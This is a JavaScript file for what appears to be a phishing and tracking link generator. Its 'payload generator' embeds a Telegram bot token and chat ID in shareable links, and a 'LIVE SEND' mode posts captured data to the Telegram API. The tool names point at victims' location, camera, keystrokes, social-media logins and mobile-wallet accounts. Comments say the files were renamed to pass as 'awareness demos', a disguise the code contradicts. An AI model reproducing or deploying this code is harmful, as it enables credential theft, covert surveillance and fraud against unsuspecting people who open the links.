// ================= MATRIX RAIN =================
const canvas = document.getElementById("matrix-bg");
const ctx = canvas.getContext("2d");

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}
resizeCanvas();
window.addEventListener("resize", resizeCanvas);

const chars =
  "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
const fontSize = 14;
let columns = Math.floor(canvas.width / fontSize);
let drops = Array(columns).fill(1);

function drawMatrix() {
  ctx.fillStyle = "rgba(0,0,0,0.05)";
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = "#0F0";
  ctx.font = fontSize + "px monospace";

  for (let i = 0; i < drops.length; i++) {
    const text = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
    if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
      drops[i] = 0;
    }
    drops[i]++;
  }
}
setInterval(drawMatrix, 50);

// ================= TOOL + COURSE PAGES =================
const toolPages = {
  // ---- PROJECT TOOLS (Educational Awareness Demos) ----
  // All paths updated to safe, neutral, renamed files/folders
  // Folder: awareness-demos/ (instead of project/)
  // No brand names, no "hack", "keylogger", "bomber", "ddos", etc.

  gps: "./awareness-demos/location-tracking-demo.html",
  camera: "./awareness-demos/camera-permission-demo.html",
  urlshortener: "./awareness-demos/url shortner.html",
  keylogger: "./awareness-demos/input-monitoring-demo.html",
  sms: "./awareness-demos/messaging-risks-demo.html",
  device: "./awareness-demos/device-fingerprinting-demo.html",
  gmail: "./awareness-demos/email-security-demo.html",
  facebook: "./awareness-demos/social-profile-security-demo.html",
  instagram: "./awareness-demos/social-feed-privacy-demo.html",
  whatsapp: "./awareness-demos/messaging-app-security-demo.html",
  telegram: "./awareness-demos/secure-messaging-demo.html",
  tiktok: "./awareness-demos/short-video-platform-risks.html",
  imo: "./awareness-demos/chat-app-security-demo.html",
  phonelookup: "./awareness-demos/phone-privacy-awareness.html",
  certificate: "./awareness-demos/ssl-tls-certificate-demo.html",
  freefire: "./awareness-demos/game-account-security-demo.html",
  bkash: "./awareness-demos/digital-wallet-security-demo.html",
  nagad: "./awareness-demos/digital-wallet-security-demo1.html", // same as bkash if similar content
  ddos: "./awareness-demos/denial-of-service-awareness.html",
  wifi: "./awareness-demos/wireless-network-security-demo.html",
  sql: "./awareness-demos/sql-injection-awareness.html",
  hashcat: "./awareness-demos/password-cracking-risks-demo.html",
  mitm: "./awareness-demos/man-in-the-middle-demo.html",
  stealth: "./awareness-demos/stealth-techniques-awareness.html",
  osint: "./awareness-demos/open-source-intelligence-demo.html",
  nmap: "./awareness-demos/network-scanning-basics.html",

  // ---- COURSES (Educational Learning Modules) ----
  // Folder: awareness-modules/ (instead of courses/)
  // Neutral, educational-focused names only

  cybersecurity: "./awareness-modules/cybersecurity-basics-2025.html",
  cehbangla: "./awareness-modules/bengali-cyber-awareness-intro.html",
  termux: "./awareness-modules/termux-security-learning.html",
  wifihack: "./awareness-modules/wireless-network-security-intro.html",
  ethicalhack: "./awareness-modules/ethical-hacking-fundamentals.html",
  kalilinux: "./awareness-modules/linux-pen-testing-tools-intro.html",
  pythonhack: "./awareness-modules/python-for-security-scripting.html",
  webhack: "./awareness-modules/web-application-security-basics.html",
  mobilehack: "./awareness-modules/mobile-device-security-awareness.html.html",
  bugbounty: "./awareness-modules/bug-bounty-hunting-basics.html",
  cloudsecurity: "./awareness-modules/cloud-security-fundamentals.html",
  ciscocyberops: "./awareness-modules/cisco-cyber-ops-study-guide.html",
  completedcyber: "./awareness-modules/complete-cybersecurity-intro.html",
  darkweb: "./awareness-modules/dark-web-risks-and-awareness.html",
  fbhacking: "./awareness-modules/social-media-account-security.html",
  premium18: "./awareness-modules/premium18.html",
  advrat: "./awareness-modules/edu-advertisement-risks.html",
  androiddev: "./awareness-modules/awareness-android-dev-security.html",
  sqliwebsite: "./awareness-modules/sql-injection-prevention-demo.html",
};

// ================= PAGE OPEN =================
function openPage(tool) {
  const page = toolPages[tool];
  if (!page) {
    alert("❌ Page not found: " + tool);
    return;
  }
  window.location.href = page;
}

// ================= PAYLOAD GENERATOR =================
function generatePayload(tool) {
  const page = toolPages[tool];
  if (!page) {
    alert("❌ Page not found");
    return;
  }

  const pageUrlObj = new URL(page, window.location.href);
  const outputDiv = document.getElementById(`output-${tool}`);

  let live = false;

  if (isSendingAllowed()) {
    const token = document.getElementById("globalBotToken")?.value.trim();
    const chat = document.getElementById("globalChatId")?.value.trim();

    if (token && chat) {
      const conf = prompt(
        'Type EXACTLY "Rnasaks" to create LIVE sending link:',
      );
      if (conf === "Rnasaks") {
        const payload = btoa(JSON.stringify({ bot: token, chat: chat, tool }));
        pageUrlObj.searchParams.set("p", payload);
        live = true;
      }
    }
  }

  const pageUrl = pageUrlObj.href;

  outputDiv.innerHTML = `
        <p class="text-pink-400 font-bold mb-2 text-xs">
            🔗 Tool Ready: ${live ? '<span style="color:#f43f5e">LIVE SEND</span>' : "DEMO"}
        </p>
        <a href="${pageUrl}" target="_blank" class="text-blue-400 underline break-all text-xs block mb-2">${pageUrl}</a>
        <div class="flex gap-2">
            <a href="${pageUrl}" target="_blank" class="bg-white/20 hover:bg-white/40 text-xs px-3 py-1 rounded font-bold text-black">🚀 OPEN</a>
            <button onclick="copyPayload('${pageUrl}')" class="bg-white/20 hover:bg-white/40 text-xs px-3 py-1 rounded font-bold text-black">📋 COPY</button>
        </div>
        ${live ? '<p class="text-xs text-red-400 mt-2">⚠️ LIVE: Will send data to Telegram</p>' : ""}
    `;
  outputDiv.style.display = "block";
}

// ================= UTILITIES =================
function copyPayload(url) {
  navigator.clipboard.writeText(url).then(() => alert("✅ LINK COPIED!"));
}

function isSendingAllowed() {
  return (
    location.hostname === "localhost" ||
    sessionStorage.getItem("telegram_send_enabled") === "1" ||
    localStorage.getItem("telegram_send_allowed") === "1"
  );
}

window.safeSendMessage = async (bot, chat, text) => {
  if (!isSendingAllowed()) {
    console.log("DEMO MODE:", text);
    return false;
  }
  try {
    const res = await fetch(`https://api.telegram.org/bot${bot}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chat, text, parse_mode: "Markdown" }),
    });
    return (await res.json()).ok;
  } catch (e) {
    console.error("safeSendMessage direct fetch failed", e);
    // network or CSP failure; nothing more we can do client-side
    return false;
  }
};
